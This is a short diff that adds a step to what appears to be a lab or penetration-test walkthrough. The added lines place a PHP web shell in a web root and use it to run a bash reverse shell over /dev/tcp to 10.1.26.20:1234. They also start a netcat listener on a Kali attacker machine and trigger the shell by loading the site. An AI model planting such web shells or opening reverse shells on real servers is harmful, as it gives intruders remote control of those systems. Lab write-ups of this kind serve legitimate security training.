@@ -383,3 +383,22 @@ root@srv-99-590:/usr/share/webmin#
             └── index.html
 ```
 
+- We can then upload a php reverse shell to the webserver into /var/www/html
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
+?>
+```
+
+- Set up listener on attacker machine
+```
+┌──(kali㉿kali-99-590)-[~]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+```
+
+- Run the reverse shell by going to http://10.1.26.30:80/
+
+
+
